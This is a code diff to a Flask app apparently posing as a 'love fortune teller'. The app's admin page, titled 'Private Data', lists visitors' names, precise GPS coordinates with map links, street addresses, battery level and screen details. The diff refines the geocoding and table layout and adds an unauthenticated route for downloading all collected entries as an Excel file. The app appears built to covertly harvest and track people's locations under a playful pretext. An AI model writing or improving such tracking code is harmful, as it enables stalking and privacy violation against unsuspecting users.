@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, abort
+from flask import Flask, request, jsonify, abort, send_file
 from flask_cors import CORS
 import pandas as pd
 import requests
@@ -29,22 +29,24 @@ def geocode_reverse(lat, lon):
             'lon': lon,
             'format': 'json',
             'addressdetails': 1,
-            'zoom': 18
+            'zoom': 18,
+            'accept-language': 'en'
         }
+        # IMPORTANT: Replace with your real email address (required by Nominatim)
         headers = {
-            'User-Agent': 'LoveFortuneTeller/1.0 (contact@example.com)'  # Important!
+            'User-Agent': 'LoveFortuneTeller/1.0 (your-email@gmail.com)'
         }
         response = requests.get(url, params=params, headers=headers, timeout=10)
         
         if response.status_code == 200:
             data = response.json()
-            if 'display_name' in data:
+            if 'display_name' in data and data['display_name']:
                 # Limit length to avoid huge strings
                 return data['display_name'][:200]
             else:
-                return f"Approx: {lat:.4f}, {lon:.4f}"
+                return f"Coordinates: {lat:.4f}, {lon:.4f}"
         else:
-            return f"Coordinates: {lat:.4f}, {lon:.4f}"
+            return f"Location: {lat:.4f}, {lon:.4f}"
     except Exception as e:
         print(f"Geocoding error: {e}")
         return f"Location: {lat:.4f}, {lon:.4f}"
@@ -323,12 +325,12 @@ button{width:100%;padding:13px;background:linear-gradient(135deg,#ff6b6b,#c06c84
         gps  = f"{row['latitude']:.4f}, {row['longitude']:.4f}"
         maps = f"https://maps.google.com/?q={row['latitude']},{row['longitude']}"
         rows += f'''<tr>
-           <td>{row['timestamp']}</td>
-           <td><b>{row['name']}</b></td>
-           <td><a href="{maps}" target="_blank">📍 {gps}</a></td>
-          <td style="max-width:220px;font-size:11px;">{row['address']}</td>
-           <td>{row['battery']}</td>
-          <td style="font-size:11px;">{row['screen']}</td>
+            <td style="white-space:nowrap;">{row['timestamp']}</td>
+            <td><b>{row['name']}</b></td>
+            <td><a href="{maps}" target="_blank">📍 {gps}</a></td>
+            <td style="max-width:280px; font-size:11px; word-break:break-word;">{row['address']}</td>
+            <td>{row['battery']}</td>
+            <td style="font-size:11px;">{row['screen']}</td>
         </tr>'''
 
     return f'''<!DOCTYPE html>
@@ -337,7 +339,7 @@ button{width:100%;padding:13px;background:linear-gradient(135deg,#ff6b6b,#c06c84
 body{{font-family:sans-serif;padding:20px;background:#fff0f5;}}
 h1{{color:#c06c84;margin-bottom:20px;}}
 table{{width:100%;border-collapse:collapse;background:#fff;border-radius:15px;
-       overflow:hidden;box-shadow:0 5px 20px rgba(0,0,0,0.08);}}
+       overflow-x:auto;display:block;box-shadow:0 5px 20px rgba(0,0,0,0.08);}}
 th{{background:linear-gradient(135deg,#ff6b6b,#c06c84);color:#fff;padding:12px 14px;text-align:left;font-size:13px;}}
 td{{padding:10px 14px;border-bottom:1px solid #ffe0e9;font-size:12px;}}
 tr:hover td{{background:#fff5f8;}}
@@ -345,11 +347,22 @@ a{{color:#c06c84;text-decoration:none;}}
 </style></head>
 <body>
 <h1>💋 Private Data — {len(df)} entries</h1>
+<div style="overflow-x:auto;">
 <table>
    <tr><th>Time</th><th>Name</th><th>Location</th><th>Address</th><th>Battery</th><th>Screen</th></tr>
   {rows}
 </table>
+</div>
+<p style="margin-top:20px;"><a href="/download-excel">📥 Download Excel file</a></p>
 </body></html>'''
+
+@app.route('/download-excel', methods=['GET'])
+def download_excel():
+    excel_path = '/tmp/fortunes_data.xlsx'
+    if os.path.exists(excel_path):
+        return send_file(excel_path, as_attachment=True, download_name='fortunes_data.xlsx')
+    else:
+        return "No data yet", 404
 
 if __name__ == '__main__':
     init_excel()
